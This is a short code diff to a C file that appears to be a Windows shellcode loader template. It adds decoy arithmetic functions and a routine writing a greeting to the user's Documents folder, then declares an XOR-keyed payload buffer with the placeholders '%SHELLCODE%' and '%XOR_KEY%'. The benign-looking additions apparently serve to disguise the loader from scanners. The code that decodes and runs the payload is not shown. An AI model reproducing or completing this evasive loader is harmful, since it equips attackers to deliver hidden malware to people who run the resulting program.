@@ -1,7 +1,33 @@
 #include "definitions.h"
 
 
-int WinMainCRTStartup() {
+// MATHS.C
+
+int divide(int a, int b) { return a / b; }
+int multiply(int a, int b) { return a * b; }
+int add(int a, int b) { return a + b; }
+int substract(int a, int b) { return a - b; }
+
+
+
+int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
+// int WinMainCRTStartup() {
+
+    char path[MAX_PATH];  // Stocke le chemin complet du fichier
+    snprintf(path, MAX_PATH, "%s\\Documents\\output.txt", getenv("USERPROFILE"));  
+
+    FILE *fichier = fopen(path, "w"); // Ouvre le fichier en mode écriture
+
+    if (fichier == NULL) {
+        printf("Erreur lors de l'ouverture du fichier : %s\n", path);
+        return 1;
+    }
+
+    fprintf(fichier, "Hello, ceci est un texte écrit dans un fichier standard !\n");
+    fclose(fichier);
+
+    printf("Texte écrit avec succès dans : %s\n", path);
+
     unsigned char payload[] = "%SHELLCODE%";
     WORD key = %XOR_KEY%;
 
